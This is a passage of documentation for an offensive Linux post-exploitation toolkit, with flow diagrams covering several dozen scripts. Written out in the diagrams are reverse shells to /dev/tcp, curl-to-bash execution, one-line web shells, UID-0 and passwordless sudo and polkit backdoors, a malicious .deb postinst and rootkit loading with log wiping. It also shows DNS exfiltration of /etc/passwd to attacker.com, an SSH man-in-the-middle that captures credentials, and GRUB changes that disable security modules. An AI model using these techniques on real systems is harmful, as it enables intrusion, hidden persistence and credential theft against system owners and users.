    D --> E["setsid /bin/bash -c<br>'exec -a PROCNAME /bin/bash<br>#gt;#amp; /dev/tcp/IP/PORT 0#gt;#amp;1 #amp;'"]
    E --> F["Reverse shell running as<br>process named PROCNAME<br>(e.g. '[kworker/0:0]')"]

    style A fill:#ff4444,color:#fff
    style E fill:#ff8800,color:#fff
    style F fill:#44aa44,color:#fff
```

---

### 18 — Process Injection

**Script:** `scripts/procinject.sh` + `procinject/` | **MITRE:** T1055.008  
**Purpose:** ptrace-based process injection into running processes.

```mermaid
flowchart TD
    A["procinject.sh"] --> B["Select target PID"]
    B --> C["Select shellcode / payload"]
    C --> D["ptrace(PTRACE_ATTACH, pid)"]
    D --> E["Read target's registers:<br>ptrace(PTRACE_GETREGS)"]
    E --> F["Write shellcode to target memory:<br>ptrace(PTRACE_POKEDATA) per word"]
    F --> G["Set RIP to shellcode address:<br>ptrace(PTRACE_SETREGS)"]
    G --> H["ptrace(PTRACE_DETACH, pid)"]
    H --> I["Shellcode executing in<br>target process context"]

    style A fill:#ff4444,color:#fff
    style D fill:#ff8800,color:#fff
    style F fill:#ff0000,color:#fff
    style I fill:#44aa44,color:#fff
```

---

### 53 — Fileless / Memfd Execution

**Script:** `scripts/memfd_exec.sh` | **MITRE:** T1027.011  
**Purpose:** Execute payloads entirely from memory using 5 different fileless techniques.

```mermaid
flowchart TD
    A["memfd_exec.sh"] --> B["Select method:<br>1. memfd_create + fexecve<br>2. /dev/shm staging<br>3. /proc/self/fd exec<br>4. Heredoc pipe<br>5. curl-to-memory"]

    B -->|1| C["Compile C helper:<br>fd = memfd_create('', MFD_CLOEXEC)<br>write(fd, elf_data, size)<br>fexecve(fd, argv, envp)"]
    C --> C1["Sub-options:<br>a. Local ELF → memfd<br>b. curl URL → write to memfd → exec<br>c. stdin pipe → memfd"]

    B -->|2| D["cp binary /dev/shm/.random_name<br>exec -a 'legit_name' /dev/shm/.random<br>rm -f /dev/shm/.random"]

    B -->|3| E["exec 3<>/tmp/.payload<br>rm /tmp/.payload<br>/proc/self/fd/3"]

    B -->|4| F["bash -c '$PAYLOAD'<br>with optional background/disown"]

    B -->|5| G["curl URL | bash<br>OR bash <(curl -s URL)<br>OR base64 decode pipe"]

    style A fill:#ff4444,color:#fff
    style C fill:#ff0000,color:#fff
    style D fill:#ff8800,color:#fff
    style G fill:#ff8800,color:#fff
```

---

## 6. Rootkits

### 08 — LKM Rootkit Modified

**Script:** `scripts/implant_rootkit.sh` | **MITRE:** T1014  
**Purpose:** Download, modify, and load Diamorphine LKM rootkit with renamed symbols to bypass rkhunter and chkrootkit.

```mermaid
flowchart TD
    A["implant_rootkit.sh"] --> B{"EUID == 0?<br>insmod? gcc?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C["mkdir /var/tmp/.cache"]
    C --> D["git clone Diamorphine<br>→ /var/tmp/.cache"]
    D --> E["Rename files:<br>diamorphine.c → rk.c<br>diamorphine.h → rk.h"]
    E --> F["sed substitutions:<br>diamorphine_secret → demonized<br>diamorphine → demonizedmod<br>signal 63 → 62<br>module_hide → module_h1dd3<br>is_invisible → e_invisible<br>hacked_getdents → hack_getdents<br>hacked_kill → h4ck_kill"]
    F --> G["make -C /var/tmp/.cache/"]
    G --> H["insmod rk.ko"]
    H --> I["make clean<br>rm -rf /var/tmp/.cache"]
    I --> J["dmesg -C<br>echo '' > /var/log/kern.log"]
    J --> K["Rootkit loaded:<br>kill -62 PID → hide process<br>kill -62 0 → root shell<br>Files with 'demonized' prefix hidden"]

    style A fill:#ff4444,color:#fff
    style F fill:#ff8800,color:#fff
    style H fill:#ff0000,color:#fff
    style K fill:#44aa44,color:#fff
```

---

### 10 — LKM Rootkit (Locutus)

**Script:** `scripts/install_locutus.sh` + `locutus/` | **MITRE:** T1014  
**Purpose:** Full-featured LKM rootkit with syscall hooking, signal-based control, file encryption, and ICMP backdoor trigger.

```mermaid
sequenceDiagram
    participant U as User/Attacker
    participant K as Kernel (Locutus LKM)
    participant P as /proc filesystem
    participant N as Network (ICMP)

    Note over K: insmod locutus.ko<br>Hooks: sys_kill, sys_getdents/64

    U->>K: kill -64 any_pid
    K-->>K: Give root (commit_creds(prepare_kernel_cred(0)))

    U->>K: kill -63 target_pid
    K-->>K: Toggle PID visibility in getdents

    U->>K: kill -62 filename_as_pid
    K-->>K: Encode file with XOR cipher

    U->>K: kill -61 filename_as_pid
    K-->>K: Decode file with XOR cipher

    N->>K: ICMP echo with magic pattern
    K->>K: borg_transwarp: spawn reverse shell
    K-->>N: Callback to attacker IP:PORT

    Note over P: getdents hook filters:<br>- Hidden PIDs<br>- Files with magic prefix<br>- Module from /proc/modules
```

```mermaid
flowchart TD
    A["install_locutus.sh"] --> B["Check: root, gcc, make, kernel headers"]
    B --> C["cd locutus/"]
    C --> D["make (Makefile compiles locutus.c)"]
    D --> E["insmod locutus.ko"]
    E --> F["Compile borg_transwarp.c<br>(ICMP trigger binary)"]
    F --> G["Deploy borg_transwarp"]
    G --> H["Clean: make clean, dmesg -C"]
    H --> I["Rootkit active with 4 signal commands<br>+ ICMP backdoor trigger"]

    style A fill:#ff4444,color:#fff
    style E fill:#ff0000,color:#fff
    style F fill:#ff8800,color:#fff
    style I fill:#44aa44,color:#fff
```

---

### 31 — Package Manager Backdoor (.deb)

**Script:** `scripts/deb_backdoor.sh` | **MITRE:** T1195.002  
**Purpose:** Create a malicious Debian package that auto-loads a rootkit module via postinst script.

```mermaid
flowchart TD
    A["deb_backdoor.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C["read ko_path (module file)"]
    C --> D["read pkg_name, version, description"]
    D --> E["Create build dir structure:<br>DEBIAN/control<br>DEBIAN/postinst<br>DEBIAN/prerm<br>DEBIAN/postrm<br>lib/modules/KVER/kernel/drivers/misc/"]
    E --> F["Copy .ko to package"]
    F --> G["DEBIAN/control:<br>Package: name, Version, Arch,<br>Description (disguised)"]
    G --> H["DEBIAN/postinst:<br>depmod -a<br>echo modname >> /etc/modules<br>modprobe modname<br>dmesg -C"]
    H --> I["DEBIAN/prerm:<br>exit 0 (prevents cleanup on removal)"]
    I --> J["DEBIAN/postrm:<br>Re-insmod if .ko still on disk"]
    J --> K["dpkg-deb --build → .deb file"]
    K --> L{"Install now?"}
    L -->|Yes| M["dpkg -i package.deb"]
    L -->|No| N["Transfer .deb to target"]

    style A fill:#ff4444,color:#fff
    style H fill:#ff0000,color:#fff
    style J fill:#ff0000,color:#fff
    style K fill:#ff8800,color:#fff
```

---

### 33 — Namespace Jail

**Script:** `scripts/ns_jail.sh` | **MITRE:** T1610  
**Purpose:** Trap users in isolated Linux namespaces while attacker operates in the real host namespace.

```mermaid
stateDiagram-v2
    [*] --> Setup: ns_jail.sh launched (root)
    Setup --> CreateNS: unshare --mount --pid --fork
    CreateNS --> MountOverlay: mount -t overlay<br>over /etc, /home, /var
    MountOverlay --> FakeProc: mount -t proc proc /proc<br>(inside namespace)
    FakeProc --> BindShell: Start login shell<br>inside namespace
    BindShell --> Trapped: User sees fake filesystem<br>Processes isolated from host

    state "Host (Real)" as Host {
        [*] --> Attacker: Operates with full<br>host access
        Attacker --> RealFS: Real /etc, /home, /var
        Attacker --> RealProc: Real /proc, all PIDs
    }

    Trapped --> Invisible: User cannot see<br>attacker processes
    Invisible --> NoEscape: No visibility of<br>host namespace
```

---

## 7. Stealth & Data Hiding

### 45 — Hidden Encrypted Filesystem

**Script:** `scripts/hidden_fs.sh` | **MITRE:** T1564.005  
**Purpose:** Create a LUKS-encrypted loopback filesystem with systemd auto-mount and emergency wipe.

```mermaid
flowchart TD
    A["hidden_fs.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C["Select operation:<br>1. Create encrypted volume<br>2. Mount existing volume<br>3. Emergency wipe<br>4. Setup auto-mount"]

    C -->|1| D["dd if=/dev/urandom of=/var/.cache_vol<br>bs=1M count=SIZE"]
    D --> E["cryptsetup luksFormat /var/.cache_vol"]
    E --> F["cryptsetup open /var/.cache_vol d3m0n_crypt"]
    F --> G["mkfs.ext4 /dev/mapper/d3m0n_crypt"]
    G --> H["mount /dev/mapper/d3m0n_crypt /mnt/.hidden"]

    C -->|3| I["cryptsetup close d3m0n_crypt"]
    I --> J["shred -vfz -n 3 /var/.cache_vol"]
    J --> K["rm -f /var/.cache_vol"]

    C -->|4| L["Create systemd unit:<br>cryptsetup open + mount<br>on boot with keyfile"]

    style A fill:#ff4444,color:#fff
    style E fill:#ff8800,color:#fff
    style J fill:#ff0000,color:#fff
```

---

### 49 — Web Shell Deployment

**Script:** `scripts/web_shell.sh` | **MITRE:** T1505.003  
**Purpose:** Deploy web shells in multiple languages — auto-detects web server document roots.

```mermaid
flowchart TD
    A["web_shell.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C["Auto-detect web roots:<br>apache: /var/www/html<br>nginx: parse nginx.conf root<br>tomcat: /var/lib/tomcat*/webapps"]
    C --> D["Select language:<br>1. PHP<br>2. Python (WSGI/CGI)<br>3. Perl CGI<br>4. JSP (Tomcat)"]

    D -->|1| E["Write PHP shell:<br><?php system($_GET['cmd']); ?>"]
    D -->|2| F["Write Python CGI:<br>os.popen(params['cmd']).read()"]
    D -->|3| G["Write Perl CGI:<br>system($cgi->param('cmd'))"]
    D -->|4| H["Write JSP:<br>Runtime.exec(request.getParameter('cmd'))"]

    E --> I["chmod 644, set web user ownership"]
    F --> I
    G --> I
    H --> I
    I --> J["Shell accessible at:<br>http://target/shell.EXT?cmd=whoami"]

    style A fill:#ff4444,color:#fff
    style E fill:#ff0000,color:#fff
    style J fill:#44aa44,color:#fff
```

---

### 55 — xattr Data Hiding

**Script:** `scripts/xattr_hide.sh` | **MITRE:** T1564.001  
**Purpose:** Store and retrieve payloads in extended file attributes — invisible to `ls`, `cat`, `find`.

```mermaid
flowchart TD
    A["xattr_hide.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C["Select operation:<br>1. Store payload in xattr<br>2. Retrieve payload<br>3. Execute from xattr<br>4. Bulk-hide across files"]

    C -->|1| D["setfattr -n user.d3m0n<br>-v PAYLOAD_DATA FILE"]
    C -->|2| E["getfattr -n user.d3m0n<br>--only-values FILE"]
    C -->|3| F["getfattr → pipe to bash"]
    C -->|4| G["find DIRECTORY -type f<br>-exec setfattr for each"]

    D --> H["Data stored in inode<br>Not visible with ls -la<br>Requires getfattr to read"]

    style A fill:#ff4444,color:#fff
    style D fill:#ff8800,color:#fff
    style H fill:#44aa44,color:#fff
```

---

## 8. Lateral Movement & C2

### 16 — ACL Persistence

**Script:** `scripts/acl.sh` | **MITRE:** T1222.002  
**Purpose:** Set POSIX ACL permissions to maintain hidden file access for a specific user.

```mermaid
flowchart TD
    A["acl.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C{"setfacl installed?"}
    C -->|No| Z2["Install: apt install acl"]
    C -->|Yes| D["read USER, PERM (rwx), FILE_PATH"]
    D --> E["setfacl -m u:USER:PERM FILE_PATH"]
    E --> F{"Success?"}
    F -->|Yes| G["ACL set: USER has PERM on FILE<br>Invisible to standard ls -l<br>Requires getfacl to discover"]
    F -->|No| H["Failed to set ACL"]

    style A fill:#ff4444,color:#fff
    style E fill:#ff8800,color:#fff
    style G fill:#44aa44,color:#fff
```

---

### 34 — SSH Tunnel Hijack

**Script:** `scripts/ssh_tunnel_hijack.sh` | **MITRE:** T1563.001  
**Purpose:** Hijack SSH ControlMaster sessions, create reverse tunnels, and inject ProxyCommand backdoors.

```mermaid
sequenceDiagram
    participant A as Attacker
    participant CM as ControlMaster Socket
    participant T as Target SSH Server

    Note over A: Find ControlMaster sockets:<br>find /tmp -name 'ssh_*' -type s

    A->>CM: ssh -S /tmp/ssh_socket<br>-O forward -L 8080:internal:80<br>user@target
    CM->>T: Reuse existing authenticated<br>session (no password needed)
    T-->>A: Port forward established

    Note over A: Alternative: ProxyCommand injection
    A->>A: Write ~/.ssh/config:<br>Host *<br>  ProxyCommand /bin/bash -c 'PAYLOAD; nc %h %p'
    A->>T: Every future SSH connection<br>triggers PAYLOAD silently
```

---

### 35 — SSH-IT: PTY MITM

**Script:** `scripts/ssh_it.sh` | **MITRE:** T1557  
**Purpose:** THC-inspired SSH client replacement with dual-connection MITM, credential capture, and worm propagation.

```mermaid
sequenceDiagram
    participant V as Victim User
    participant W as SSH-IT Wrapper
    participant R as Real SSH Server
    participant A as Attacker Session

    Note over W: Installed as /usr/local/bin/ssh<br>PATH priority over /usr/bin/ssh

    V->>W: ssh user@server
    W->>W: parse_ssh_dest(): extract target
    W->>W: filter_ssh_args(): sanitize for infiltrator

    par Dual Connection
        W->>R: Real connection (user's session)<br>via script command (PTY capture)
        W->>R: Infiltrator connection (attacker's)<br>bound to 127.0.0.1:PORT
    end

    W->>W: Log credentials to LOGDIR
    W->>W: Hex-encode backdoor profile<br>into ~/.bashrc on remote

    V->>R: User interacts normally<br>(unaware of MITM)
    A->>R: Attacker piggybacks via<br>infiltrator session

    Note over W: Optional: worm propagation<br>Copy SSH-IT wrapper to remote host
```

---

### 38 — Port Knocking / Socket Filter

**Script:** `scripts/socket_filter.sh` | **MITRE:** T1205.002  
**Purpose:** Implement port knocking sequences, single-packet authentication, and ICMP knock triggers via iptables.

```mermaid
stateDiagram-v2
    [*] --> Closed: All ports filtered by iptables
    Closed --> Knock1: Receive SYN on port 7000
    Knock1 --> Knock2: Receive SYN on port 8000<br>(within 5s timeout)
    Knock2 --> Knock3: Receive SYN on port 9000<br>(within 5s timeout)
    Knock3 --> Open: iptables -A INPUT<br>-s KNOCKER_IP -p tcp<br>--dport 22 -j ACCEPT
    Open --> Closed: Timeout (30s) or<br>explicit close knock

    state "Alternative: SPA" as SPA {
        [*] --> Listen: ncat -u -l 53
        Listen --> Verify: Receive UDP packet<br>with HMAC signature
        Verify --> Grant: Verify HMAC → open port
    }

    state "Alternative: ICMP" as ICMP {
        [*] --> ICMPListen: Listen for ICMP echo
        ICMPListen --> ICMPAuth: Check payload magic bytes
        ICMPAuth --> ICMPOpen: Open port for source IP
    }
```

---

### 50 — Phantom User Creation

**Script:** `scripts/phantom_user.sh` | **MITRE:** T1136.001  
**Purpose:** Create invisible users — UID-0 clones, nologin service accounts, or hidden users with utmp/wtmp cleanup.

```mermaid
flowchart TD
    A["phantom_user.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C["Select method:<br>1. UID-0 clone (root equivalent)<br>2. Nologin service account<br>3. Invisible user (utmp/wtmp cleanup)"]

    C -->|1| D["echo 'phantom:x:0:0::/root:/bin/bash'<br>>> /etc/passwd<br>Set password in /etc/shadow"]
    C -->|2| E["useradd -r -s /usr/sbin/nologin<br>-d /nonexistent phantom<br>Doesn't appear in login screens"]
    C -->|3| F["useradd phantom<br>Then: utmpdump/edit/utmpdump<br>remove login records from<br>utmp, wtmp, lastlog, btmp"]

    D --> G["User has UID 0<br>Full root access<br>Hidden among system accounts"]
    E --> G
    F --> G

    style A fill:#ff4444,color:#fff
    style D fill:#ff0000,color:#fff
    style F fill:#ff8800,color:#fff
    style G fill:#44aa44,color:#fff
```

---

### 59 — DNS Tunneling C2

**Script:** `scripts/dns_tunnel.sh` | **MITRE:** T1071.004  
**Purpose:** Exfiltrate data and receive commands via DNS queries — TXT records, subdomain encoding, and iodine tunnel.

```mermaid
sequenceDiagram
    participant V as Victim
    participant D as DNS Resolver
    participant C2 as Attacker DNS Server

    Note over V,C2: Method 1: TXT Record Exfil

    V->>V: data=$(base64 /etc/passwd)
    V->>D: nslookup -type=TXT<br>DATA_CHUNK.exfil.attacker.com
    D->>C2: DNS query forwarded
    C2->>C2: Log subdomain = exfiltrated data

    Note over V,C2: Method 2: Subdomain Encoding

    V->>V: Split data into 63-byte labels
    V->>D: dig CHUNK1.CHUNK2.c2.attacker.com
    D->>C2: Query reaches authoritative NS
    C2->>C2: Reassemble data from subdomain labels

    Note over V,C2: Method 3: DNS C2 Poll Loop

    loop Every 30s
        V->>D: dig TXT cmd.c2.attacker.com
        D->>C2: Forward query
        C2-->>V: TXT response = base64 command
        V->>V: Decode + execute command
        V->>D: dig result.c2.attacker.com<br>(output as subdomain)
    end

    Note over V,C2: Method 4: Iodine Tunnel

    V->>V: iodine -f -P password<br>tunnel.attacker.com
    Note over V,C2: Full IP-over-DNS tunnel<br>SSH, HTTP, etc. over DNS
```

---

## Advanced Techniques (from Research)

### 65 — Diamorphine Rootkit Auto-Deploy

**Script:** `scripts/diamorphine.sh` | **Menu:** [65] | **MITRE:** T1014  
**Purpose:** Automated deployment of the Diamorphine LKM rootkit — git clone, compile, load, and signal-based control for process hiding, privilege escalation, and module visibility toggle.

```mermaid
flowchart TD
    A["diamorphine.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C["Select:<br>1. Install<br>2. Hide PID<br>3. Elevate root<br>4. Toggle visibility<br>5. Uninstall"]

    C -->|1| D["Check: git, make, gcc, insmod"]
    D --> D1["Check kernel headers:<br>/lib/modules/$(uname -r)/build"]
    D1 --> D2["git clone Diamorphine<br>→ /var/tmp/.d3m0n_diamorphine"]
    D2 --> D3["make -C (compile .ko)"]
    D3 --> D4["insmod diamorphine.ko"]
    D4 --> D5["dmesg -C (clear traces)<br>make clean + rm -rf clone dir"]
    D5 --> D6["Module loaded, hidden from lsmod"]

    C -->|2| E["read PID → kill -31 PID<br>Process hidden from /proc"]
    C -->|3| F["kill -64 $$ → caller gets UID 0"]
    C -->|4| G["kill -63 $$ → toggle module<br>in/out of lsmod"]
    C -->|5| H["kill -63 (unhide) → rmmod diamorphine"]

    style A fill:#ff4444,color:#fff
    style D4 fill:#ff0000,color:#fff
    style D6 fill:#44aa44,color:#fff
    style E fill:#ff8800,color:#fff
    style F fill:#ff0000,color:#fff
```

---

### 66 — Systemd Generator Persistence

**Script:** `scripts/systemd_generator.sh` | **Menu:** [66] | **MITRE:** T1543.002  
**Purpose:** Install a malicious systemd generator that creates .service units at boot time — executes BEFORE any regular service, survives systemctl disable.

```mermaid
flowchart TD
    A["systemd_generator.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C["Select:<br>1. Revshell generator<br>2. Custom command<br>3. Cleanup"]

    C -->|1| D["Read LHOST, LPORT"]
    D --> D1["Select generator dir:<br>1. /etc/systemd/system-generators<br>2. /usr/local/lib/systemd/system-generators<br>3. /lib/systemd/system-generators"]
    D1 --> D2["Write d3m0n-persist script:<br>#!/bin/bash<br>NORMAL_DIR=$1<br>cat > service unit<br>ln -sf into multi-user.target.wants"]
    D2 --> D3["chmod 755"]
    D3 --> D4["Generator runs at EVERY boot<br>before systemd starts services"]

    C -->|2| E["Read custom command"]
    E --> D1

    C -->|3| F["rm -f d3m0n-* from all 3 dirs<br>systemctl daemon-reload"]

    style A fill:#ff4444,color:#fff
    style D2 fill:#ff0000,color:#fff
    style D4 fill:#44aa44,color:#fff
```

**Key Insight:** Systemd generators run as executables in special directories during early boot. They output unit files to a temporary directory that systemd then loads. This runs BEFORE `systemctl enable/disable` is evaluated, making it very persistent.

---

### 67 — NetworkManager Dispatcher Persistence

**Script:** `scripts/nm_dispatcher.sh` | **Menu:** [67] | **MITRE:** T1546  
**Purpose:** Drop scripts in `/etc/NetworkManager/dispatcher.d/` that trigger on network events (interface up/down, DHCP changes).

```mermaid
flowchart TD
    A["nm_dispatcher.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C["Check NetworkManager running"]
    C --> D["Select:<br>1. Revshell on interface up<br>2. Custom command on event<br>3. List installed<br>4. Cleanup"]

    D -->|1| E["Read LHOST, LPORT"]
    E --> F["Write /etc/NetworkManager/dispatcher.d/01-d3m0n:<br>#!/bin/bash<br>IFACE=$1; ACTION=$2<br>if ACTION=up → nohup revshell &"]
    F --> G["chmod 755"]
    G --> H["Triggers every network reconnect"]

    D -->|2| I["Read command + event type"]
    I --> F

    D -->|3| J["ls -la dispatcher.d/*d3m0n*"]
    D -->|4| K["rm -f dispatcher.d/*d3m0n*"]

    style A fill:#ff4444,color:#fff
    style F fill:#ff0000,color:#fff
    style H fill:#44aa44,color:#fff
```

---

### 68 — Polkit Privilege Escalation Backdoor

**Script:** `scripts/polkit_backdoor.sh` | **Menu:** [68] | **MITRE:** T1548  
**Purpose:** Install permissive polkit rules that grant a user passwordless privilege escalation via pkexec or any polkit-protected action.

```mermaid
flowchart TD
    A["polkit_backdoor.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C{"Detect polkit version"}
    C -->|"ge 0.106 JS"| D["Select:<br>1. JS rule any action<br>2. JS rule specific action<br>3. Cleanup"]
    C -->|"lt 0.106 pkla"| E["Select:<br>1. .pkla rule any action<br>2. .pkla rule specific<br>3. Cleanup"]

    D -->|1| F["Read username"]
    F --> G["Write /etc/polkit-1/rules.d/49-d3m0n-nopasswd.rules:<br>polkit.addRule(function(action,subject){<br>  if(subject.user=='USER') return YES;<br>});"]
    G --> H["User can pkexec ANY command<br>without password"]

    E -->|1| I["Read username"]
    I --> J["Write /etc/polkit-1/localauthority/<br>50-local.d/d3m0n-nopasswd.pkla:<br>[d3m0n_polkit]<br>Identity=unix-user:USER<br>Action=*<br>ResultAny=yes"]
    J --> H

    style A fill:#ff4444,color:#fff
    style G fill:#ff0000,color:#fff
    style J fill:#ff0000,color:#fff
    style H fill:#44aa44,color:#fff
```

---

### 69 — Sudoers Backdoor

**Script:** `scripts/sudoers_backdoor.sh` | **Menu:** [69] | **MITRE:** T1548.003  
**Purpose:** Add NOPASSWD entries to `/etc/sudoers.d/` with syntax validation via `visudo -c`.

```mermaid
flowchart TD
    A["sudoers_backdoor.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C["Select:<br>1. NOPASSWD ALL for user<br>2. NOPASSWD for specific command<br>3. NOPASSWD for group<br>4. List installed<br>5. Cleanup"]

    C -->|1| D["Read username"]
    D --> E["Write /etc/sudoers.d/d3m0n-backdoor:<br># d3m0n_sudoers<br>USER ALL=(ALL:ALL) NOPASSWD: ALL"]
    E --> F["chmod 440"]
    F --> G{"visudo -c -f<br>syntax check"}
    G -->|Pass| H["Installed — user has<br>passwordless sudo"]
    G -->|Fail| I["rm -f file<br>Report syntax error"]

    C -->|2| J["Read username + command"]
    J --> K["Write USER ALL=(ALL) NOPASSWD: /path/cmd"]
    K --> F

    C -->|5| L["rm -f /etc/sudoers.d/d3m0n-*"]

    style A fill:#ff4444,color:#fff
    style E fill:#ff0000,color:#fff
    style G fill:#ff8800,color:#fff
    style H fill:#44aa44,color:#fff
```

---

### 70 — eBPF-Based Process/File Hiding

**Script:** `scripts/ebpf_hide.sh` | **Menu:** [70] | **MITRE:** T1564  
**Purpose:** Use eBPF programs to intercept syscalls (getdents64) and hide processes/files at the kernel level. Supports ebpfkit and TripleCross rootkit deployment.

```mermaid
flowchart TD
    A["ebpf_hide.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C{"Kernel ge 4.15?"}
    C -->|No| Z1["Exit: eBPF not supported"]
    C -->|Yes| D["Select:<br>1. Install bcc-tools<br>2. bpftrace monitor<br>3. bcc-python hider<br>4. Clone ebpfkit<br>5. Clone TripleCross<br>6. Status"]

    D -->|1| E["apt install bpfcc-tools<br>bpftrace python3-bpfcc<br>linux-headers-$(uname -r)"]

    D -->|2| F["bpftrace -e tracepoint<br>syscalls:sys_enter_getdents64<br>prints PID reading directory"]

    D -->|3| G["Generate bcc-python script:<br>attach_kprobe getdents64<br>filter entries matching PREFIX"]
    G --> G1["Run as daemon<br>save PID to /var/tmp/.d3m0n_ebpf_pid"]

    D -->|4| H["git clone ebpfkit<br>→ /var/tmp/.d3m0n_ebpf_rk"]
    D -->|5| I["git clone TripleCross<br>→ /var/tmp/.d3m0n_ebpf_rk"]

    D -->|6| J["bpftool prog list<br>Show loaded eBPF programs"]

    style A fill:#ff4444,color:#fff
    style G fill:#ff0000,color:#fff
    style H fill:#ff8800,color:#fff
    style I fill:#ff8800,color:#fff
```

**Key Insight:** eBPF rootkits operate at the kernel level without loadable kernel modules, making them harder to detect. They hook syscalls via BPF programs attached to kprobes/tracepoints.

---

### 71 — Modprobe.d Event Hijacking

**Script:** `scripts/modprobe_hijack.sh` | **Menu:** [71] | **MITRE:** T1547.006  
**Purpose:** Use `/etc/modprobe.d/` `install` directives to execute payloads whenever a kernel module is loaded (manually or automatically).

```mermaid
flowchart TD
    A["modprobe_hijack.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C["Select:<br>1. Hook module (revshell)<br>2. Hook module (custom)<br>3. List hooks<br>4. Cleanup"]

    C -->|1| D["Select module:<br>usb-storage, fuse,<br>bluetooth, snd-pcm, etc."]
    D --> E["Read LHOST, LPORT"]
    E --> F["Write /etc/modprobe.d/d3m0n-MODULE.conf:<br>install MODULE /bin/bash -c<br>'nohup bash -i #gt;#amp; /dev/tcp/IP/PORT 0#gt;#amp;1'<br>/sbin/modprobe --ignore-install MODULE"]
    F --> G["Module loads normally<br>+ payload executes"]

    C -->|2| H["Read module + command"]
    H --> F

    C -->|3| I["cat /etc/modprobe.d/d3m0n-*"]
    C -->|4| J["rm -f /etc/modprobe.d/d3m0n-*"]

    style A fill:#ff4444,color:#fff
    style F fill:#ff0000,color:#fff
    style G fill:#44aa44,color:#fff
```

**Key Insight:** The `install` directive in modprobe.d runs a shell command instead of the normal module load. Using `--ignore-install` after the payload ensures the real module still loads, making it transparent.

---

### 72 — GRUB Bootloader Backdoor

**Script:** `scripts/grub_backdoor.sh` | **Menu:** [72] | **MITRE:** T1542  
**Purpose:** Inject hidden GRUB menu entries (init=/bin/bash for root shell) and modify kernel command line parameters to disable security modules.

```mermaid
flowchart TD
    A["grub_backdoor.sh"] --> B{"EUID == 0?"}
    B -->|No| Z["Exit"]
    B -->|Yes| C["Select:<br>1. Hidden GRUB entry (root shell)<br>2. Disable security module<br>3. Custom GRUB entry<br>4. Backup/Restore<br>5. Cleanup"]

    C -->|1| D["Auto-detect:<br>vmlinuz, initrd, root device"]
    D --> E["Write /etc/grub.d/41_d3m0n_recovery:<br>menuentry 'System Recovery' {<br>  linux KERNEL root=DEVICE init=/bin/bash<br>  initrd INITRD<br>}"]
    E --> F["update-grub / grub2-mkconfig"]
    F --> G["Hidden entry at boot<br>Select → drops to root shell"]

    C -->|2| H["Select: apparmor=0 / selinux=0 / audit=0"]
    H --> I["Backup /etc/default/grub"]
    I --> J["sed append to GRUB_CMDLINE_LINUX_DEFAULT"]
    J --> F

    C -->|4| K["cp grub.d3m0n.bak → grub<br>Restore original config"]
    C -->|5| L["rm /etc/grub.d/41_d3m0n_*<br>Restore backup + update-grub"]

    style A fill:#ff4444,color:#fff
    style E fill:#ff0000,color:#fff
    style G fill:#44aa44,color:#fff
    style J fill:#ff8800,color:#fff
```

---

### 73 — Mount Namespace Stashspace

**Script:** `scripts/ns_stashspace.sh` | **Menu:** [73] | **MITRE:** T1564.001  
**Purpose:** Create isolated mount namespaces with tmpfs overlays to stash files, tools, and processes invisible to the host filesystem. Works with or without root.

```mermaid
flowchart TD
    A["ns_stashspace.sh"] --> B["Select:<br>1. Root stashspace<br>2. Unprivileged stashspace<br>3. Access existing<br>4. Process masquerade<br>5. Anti-forensic shell<br>6. Persistent daemon<br>7. Detect stashspaces<br>8. Cleanup"]

    B -->|1| C{"EUID == 0?"}
    C -->|Yes| D["nsenter -t PID --mount"]
    D --> E["mount -t tmpfs tmpfs /path<br>→ stash files in namespace"]

    B -->|2| F["unshare -m -U --map-root-user"]
    F --> G["mount -t tmpfs tmpfs /path<br>No root needed (user ns)"]

    B -->|3| H["nsenter -t PID -m<br>Access existing namespace"]

    B -->|4| I["Copy binary to /proc/self/fd/N<br>Exec with argv[0] = legitimate name"]

    B -->|5| J["unshare -m → mount tmpfs on $HOME<br>mount --bind /dev/null on<br>nsswitch.conf, bashrc, profile"]
    J --> K["exec bash --norc --noprofile<br>No history, no atime, no logs"]

    B -->|6| L["Compile C daemon:<br>daemon() + unshare(CLONE_NEWNS)<br>mount tmpfs + drop PID file"]
    L --> M["Persistent background process<br>in isolated namespace"]

    B -->|7| N["Scan /proc/*/ns/mnt<br>Compare to default namespace<br>Flag non-matching PIDs"]

    B -->|8| O["Kill daemon PID<br>rm PID file + binary"]

    style A fill:#ff4444,color:#fff
    style E fill:#ff0000,color:#fff
    style G fill:#ff8800,color:#fff
    style K fill:#44aa44,color:#fff
    style M fill:#44aa44,color:#fff
    style N fill:#4488ff,color:#fff
```

**Key Insight:** Mount namespaces isolate the filesystem view per-process. Files in a namespace's tmpfs mount are invisible from the host — they don't appear in `find`, `ls`, or forensic disk images because they only exist in memory within that namespace. The `unshare -m -U --map-root-user` trick allows unprivileged users to create stashspaces.

---

### 74 — SystemD Drop-in Override

**Script:** `scripts/systemd_override.sh` | **Menu:** [74] | **MITRE:** T1543.002  
**Purpose:** Install ExecStartPost drop-in override on existing legitimate services (ssh, cron, etc.) so payloads execute whenever the service starts, without modifying the original unit file.

```mermaid
flowchart TD
    A["systemd_override.sh"] --> B["Select:\n1. Reverse shell override\n2. Custom command\n3. List services\n4. List installed overrides\n5. Cleanup"]

    B -->|1| C["List running services:\nsystemctl list-units --type=service"]
    C --> D["User selects target service\ndefault: ssh"]
    D --> E{"systemctl cat SERVICE\nService exists?"}
    E -->|No| F["Abort"]
    E -->|Yes| G["mkdir -p /etc/systemd/system/\nSERVICE.service.d/"]
